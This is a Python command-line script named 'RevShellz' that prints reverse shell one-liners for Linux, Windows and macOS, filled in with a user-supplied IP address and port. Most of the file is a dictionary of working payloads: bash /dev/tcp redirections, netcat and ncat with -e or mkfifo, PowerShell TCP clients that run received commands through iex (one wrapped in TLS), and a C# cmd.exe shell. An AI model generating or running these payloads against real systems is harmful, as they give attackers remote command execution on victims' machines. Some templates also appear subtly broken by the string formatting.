import os
import pyfiglet
import argparse

# Term colors
class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
# Define the reverse shell examples
reverse_shells = {
    'linux': {
        'bash -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
        'bash 196': '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196',
        'bash read line': 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done',
        'bash 5': 'bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
        'bash udp': 'sh -i >& /dev/udp/{}/{} 0>&1',
        'nc mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
        'nc -e': 'nc -e /bin/sh {0} {1}',
        'nc -c': 'nc -c /bin/sh {0} {1}',
        'ncat -e': 'ncat {0} {1} -e /bin/sh',
    },
    'windows': {
        'nc.exe -e': 'nc.exe -e cmd.exe {} {}',
        'ncat.exe -e': 'ncat.exe -e cmd.exe {} {}',
        'PowerShell #1': 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}; $client.Close()',
        'PowerShell #2': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
        'PowerShell #3': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();$writer = new-object System.IO.StreamWriter($stream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;$writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \'));$writer.Flush();while(($i = $stream.Read($buffer, 0, 1024)) -ne 0){{; $data = $encoding.GetString($buffer,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $writer.Write([System.Text.Encoding]::ASCII.GetBytes($sendback)); $writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \')); $writer.Flush()}}; $client.Close()"',
        'PowerShell #4 (TLS)': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$sslStream.AuthenticateAsClient(\'localhost\');$writer = new-object System.IO.StreamWriter($sslStream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;$writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \'));$writer.Flush();while(($i = $sslStream.Read($buffer, 0, 1024)) -ne 0){{; $data = $encoding.GetString($buffer,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $writer.Write([System.Text.Encoding]::ASCII.GetBytes($sendback)); $writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + \'> \')); $writer.Flush()}}; $client.Close()"',
        'C# Bash -i': '''using System;using System.Diagnostics;using System.Net.Sockets;using System.Text;class Program{static void Main(string[] args){using(TcpClient client = new TcpClient("{0}", {1})){using(NetworkStream stream = client.GetStream()){using(StreamReader reader = new StreamReader(stream, Encoding.ASCII)){using(StreamWriter writer = new StreamWriter(stream, Encoding.ASCII)){writer.AutoFlush = true;string inputLine;Process process = new Process();process.StartInfo.FileName = "cmd.exe";process.StartInfo.UseShellExecute = false;process.StartInfo.RedirectStandardOutput = true;process.StartInfo.RedirectStandardInput = true;process.Start();while ((inputLine = reader.ReadLine()) != null){process.StandardInput.WriteLine(inputLine);}}}}}}}}''',
    },
    'macos': {
        'bash -i': 'bash -i >& /dev/tcp/{}/{} 0>&1',
        'bash 196': '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196',
        'bash read line': 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done',
        'bash 5': 'bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
        'nc mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
        'nc -e': 'nc -e /bin/sh {0} {1}',
        'nc -c': 'nc -c /bin/sh {0} {1}',
        'ncat -e': 'ncat {0} {1} -e /bin/sh',
    }
}

def list_reverse_shells(os_category):
    """List available reverse shells for a given OS category."""
    os_category = os_category.lower()
    if os_category in reverse_shells:
        print(f"Available reverse shell types for {os_category.capitalize()}:")
        for key in reverse_shells[os_category]:
            print(f"- {key}")
    else:
        print(f"No reverse shells available for OS category: {os_category}")

def generate_reverse_shells(ip, port, os_category, shell_type):
    """Generate reverse shell commands based on provided arguments."""
    os_category = os_category.lower()
    if os_category in reverse_shells and shell_type in reverse_shells[os_category]:
        command = reverse_shells[os_category][shell_type]
        # Print the values of the arguments
        print(f'{bcolors.GREEN}{bcolors.BOLD}IP Address:{bcolors.ENDC}{bcolors.BLUE} {ip}')
        print(f'{bcolors.GREEN}{bcolors.BOLD}Port:{bcolors.ENDC}{bcolors.BLUE} {port}')
        print(f'{bcolors.GREEN}{bcolors.BOLD}Traget Operating System:{bcolors.ENDC}{bcolors.BLUE} {os_category.capitalize()}')
        print(f"{bcolors.GREEN}{bcolors.BOLD}Reverse shell command for {os_category.capitalize()} ({shell_type}):\n{bcolors.BLUE}")
        print(command.format(ip, port))
    else:
        print(f"No command found for OS: {os_category} and reverse shell type: {shell_type}")

def main():
    # Print the banner
    os.system("clear")
    banner = pyfiglet.figlet_format("RevShellz", font="pagga")
    print(f"{bcolors.WARNING}"+banner)
    print(f"{bcolors.BLUE}{bcolors.BOLD}     Made with ❤️  by {bcolors.FAIL}@mkdirlove\n{bcolors.ENDC}{bcolors.GREEN}")

    # Create the parser
    parser = argparse.ArgumentParser(description='Process IP address, port, operating system, and reverse shell type.')

    # Add the arguments
    parser.add_argument('-ip', '--ip_add', type=str, help='IP address')
    parser.add_argument('-p', '--port', type=int, help='Port number')
    parser.add_argument('-os', '--operating_sys', type=str, help='Operating system')
    parser.add_argument('-rs', '--rev_shell', type=str, help='Reverse shell type')
    parser.add_argument('-l', '--list', type=str, help='List available reverse shells by OS category')

    # Parse the arguments
    args = parser.parse_args()

    if args.list:
        list_reverse_shells(args.list.lower())
        return

    if not (args.ip_add and args.port and args.operating_sys and args.rev_shell):
        parser.error('IP address, port, operating system, and reverse shell type are required unless listing.')

    # Generate and print the reverse shell command
    generate_reverse_shells(args.ip_add, args.port, args.operating_sys, args.rev_shell)

if __name__ == "__main__":
    main()
